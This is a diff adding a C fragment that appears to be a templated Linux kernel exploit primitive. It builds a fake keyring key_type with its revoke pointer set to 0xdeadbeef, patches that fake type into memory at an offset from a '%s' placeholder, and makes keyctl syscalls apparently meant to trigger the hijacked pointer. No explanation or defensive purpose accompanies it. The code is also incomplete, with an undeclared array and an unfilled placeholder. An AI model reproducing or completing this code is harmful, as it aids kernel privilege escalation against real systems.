@@ -1,0 +1,21 @@
+struct key_type {
+    char * name;
+    size_t datalen;
+    void * vet_description;
+    void * preparse;
+    void * free_preparse;
+    void * instantiate;
+    void * update;
+    void * match_preparse;
+    void * match_free;
+    void * revoke;
+    void * destroy;
+};
+struct key_type my_key_type;
+void do_allocKey() {
+	s[0] = syscall(__NR_keyctl, 1, "keyring", 0, 0, 0);
+	syscall(__NR_keyctl, 5, s[0], 0x3f3f3f3f, 0, 0);
+	my_key_type.revoke = (void*)0xdeadbeef;
+	*(unsigned long*)(%s+0x80)=&my_key_type;
+	syscall(__NR_keyctl, 3, 0xfffffffffffffffd, 0, 0, 0);
+}
